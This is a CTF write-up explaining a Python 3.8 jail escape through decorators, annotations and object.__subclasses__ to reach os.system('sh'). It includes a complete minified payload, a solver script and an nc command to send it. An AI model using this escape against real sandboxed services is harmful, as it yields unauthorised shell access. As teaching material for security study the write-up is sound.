+++
title = 'Leto CTF 2021 — confident-confinement'
date = 2021-06-14T14:18:43+03:00
tags = ['ctf', 'writeup', 'misc']
toc = true
tldr = 'escape a python jail with decorators and type annotations'
+++

## Overview

Source code:

```python
#!/usr/bin/env python3.8

import sys
import string


def main():
    enabled = string.ascii_lowercase + string.punctuation + string.whitespace
    disabled = '+-*/%&|^~<>="\'(){}, '
    alphabet = set(enabled) - set(disabled)

    max_length = 400
    
    print(f'len(alphabet) == {len(alphabet)}')
    print(sys.version)

    code = input('>>> ')

    if len(code) > max_length or any(char not in alphabet for char in code):
        print('Bad code :(')
        return

    try:
        exec(code, {'__builtins__': {}})
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
```

The goal is to execute an arbitrary code in restricted Python 3.8 syntax. We could send a string with length < 400 using 44 symbols:

```
\t\n\x0b\x0c\r!#$.:;?@[\]_`abcdefghijklmnopqrstuvwxyz
```

The code will be executed with `exec()` and empty `__builtins__`, it means that we can't use builtin functions (`print()`, `eval()`, etc):

```python
exec(code, {'__builtins__': {}})
```

## Solution

Let's note the following observations:

- we can't use spaces and the service reads only the first line, therefore we need to replace `'\n'` with `'\r'` and `' '` with `'\x0c'`
- we can't use assignments, but can use for loops instead, since they creates global variables or modifies object fields
- most of literals (strings, numbers, None, ...) are banned, but we can use empty list (`[]`) and Ellipsis (`...`)
- we will use type annotations to create strings in `__annotations__` dictionary
- we will use decorators (`@`) in order to call functions

Our target is to call `os.system('sh')`, so we need to import `os` module. Luckily we have access to classes inherited from `object` (using `object.__subclasses__()`), and we could find `BuiltinImporter` there. Let's find a way to access it.

## Create `'__build_class__'` string

In order to use decorators we need either function declaration (`def f(): ...`) or class declaration (`class x: ...`). We can't declare functions since the parenthesis are banned, we can't declare classes since the builtin function `__build_class__` is not defined. All we need for class definition is function `__builtins__['__build_class__']` which accepts two arguments.

In order to use key `'__build_class__'` we need to create a string `'__build_class__'`. Let's use type annotations and set type `...` for non-existing variable `__build_class__`:

```python
__build_class__: ...
```

Now the `__annotations__` contains the string `'__build_class__'`. Since the `__annotations__` is a dictionary we can iterate over it to write the single key into the variable:

```python
for method_name in __annotations__:
    pass
```

Now the `method_name` variable contains the string `'__build_class__'`.

## Create `__build_class__()` function

Now we're ready to write a function into `__builtins__['__build_class__']`. We need to choose the proper function.

The signature of the original function is `__build_class__(func: function, name: str)`, where `name` is a class name. If we will found the function which accepts two arguments and returning the second argument we will able to transform class declarations into strings. And such function exists:

```python
__builtins__.get(key: object, default: object)
```

This function performs a search in `__builtins__` dictionary and returns `default` when the `key` does not exist. The `func` argument is created just after the `__build_class__` call, so it won't be in the `__buildins__` dictionary. Therefore we will get the second argument, the class name:

```python
for __builtins__[method_name] in [__builtins__.get]:
    pass
```

After this `__builtins__['__build_class__']` will be equal to `__builtins__.get`.

## Create variable containing the pointer to `<class 'object'>`

`method_name` is a string, then `method_name.__class__` is a type `<class 'str'>`, so `method_name.__class__.__base__` is a type `<class 'object'>`. We can define the `object` type:

```python
for object_type in [method_name.__class__.__base__]:
    pass
```

## Get `<class 'object'>` from the class declaration

`object_type` is a `<class 'object'>`, then `object_type.__class__` is a `<class 'type'>` and `object_type.__class__.__name__` is a string `'type'`. We remember that after the declaration of class `class type: ...` we would get the string `'type'`. Let's use it as a key in some dictionary (for example `__builtins__`) to use on the class the decorator `@__builtins__.get` and get the `object_type`:

```python
for __builtins__[object_type.__class__.__name__] in [object_type]:
    pass
```

Now the `__builtins__['type']` contains `<class 'object'>`.

## Get all subclasses of `object`

Since `object_type.__class__` is a `<class 'type'>`, then `object_type.__class__.__subclasses__(t: type)` is a function returning all subclasses of class `t`. If we pass `object_type` into the function we will get all subclasses of the class `object`:

```python
@object_type.__class__.__subclasses__
@__builtins__.get
class type:
    pass
```

The class declaration will return the string `'type'`, then call to `@__builtins__.get` on this string will return `<class 'object'>`, and call to `@object_type.__class__.__subclasses__` on `object` will return the list of all classes inherited from `object` and save them into the `type` variable (the class name).

## Extract the class `BuiltinImporter`

Let's run the used Python version locally and find that `BuiltinImporter` class is located at the offset 84. Then we need to use a function `type.__getitem__` of the list `type` and pass the number 84 there. But usage of numbers is banned, so we need to create it somehow. We know that `method_name.__class__` is a `<class 'str'>`, then `method_name.__class__.__sizeof__` is a method of string class returning the size of internal structure inside the CPython memory. We won't dive into the CPython internals, just notice that the structure of 35-length string has a size 84. Therefore we need to create the string of such length and call the methods:

```python
@type.__getitem__
@method_name.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:
    pass
```

Now the variable `offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx` contains the class `BuiltinImporter`.

## Import `os` and call `os.system('sh')`

The class `BuiltinImporter` has the method `load_module`, which accepts the module name as its first argument. The next steps are trivial: we need to create a string `'os'`, call `BuiltinImporter.load_module` on this string, then create a string `'sh'` and call `os.system()`. We need two classes:

```python
@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:
    pass
```

Now the variable `os` contains the module `os`.

```python
@os.system
class sh:
    pass
```

At this moment we will spawn the shell.

## Example solver

```python
__build_class__: ...

for method_name in __annotations__:
    pass

for __builtins__[method_name] in [__builtins__.get]:
    pass

for object_type in [method_name.__class__.__base__]:
    pass

for __builtins__[object_type.__class__.__name__] in [object_type]:
    pass

@object_type.__class__.__subclasses__
@__builtins__.get
class type:
    pass

@type.__getitem__
@method_name.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:
    pass

@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:
    pass

@os.system
class sh:
    pass
```

This exploit works on Python 3.8, but it exceedes length 400, so we will minify it: move `__builtins__` to shorter variable, rename variables to single char, replace `...` and `pass` with `[]`, rename unused whitespace symbols. Then we will get something like this:

```python
__build_class__:[]
for b in[__builtins__]:[]
for m in __annotations__:[]
for b[m]in[b.get]:[]
for o in[m.__class__.__base__]:[]
for b[o.__class__.__name__]in[o]:[]
@o.__class__.__subclasses__
@b.get
class type:[]
@type.__getitem__
@m.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:[]
@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:[]
@os.system
class sh:[]
```

The length is 383. Don't forget to replace all spaces to `\x0c` and newlines to `\r`. The example solver:

```python
#!/usr/bin/env python3.8

import sys


payload = '''
__build_class__:[]
for b in[__builtins__]:[]
for m in __annotations__:[]
for b[m]in[b.get]:[]
for o in[m.__class__.__base__]:[]
for b[o.__class__.__name__]in[o]:[]
@o.__class__.__subclasses__
@b.get
class type:[]
@type.__getitem__
@m.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:[]
@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:[]
@os.system
class sh:[]
'''

result = payload.strip().replace(' ', '\x0c').replace('\n', '\r')

print(f'len(result) == {len(result)}', file=sys.stderr)
print(result)
```

Run it as following:

```sh
(python3 solver.py; cat) | nc HOST 17172 -v
```
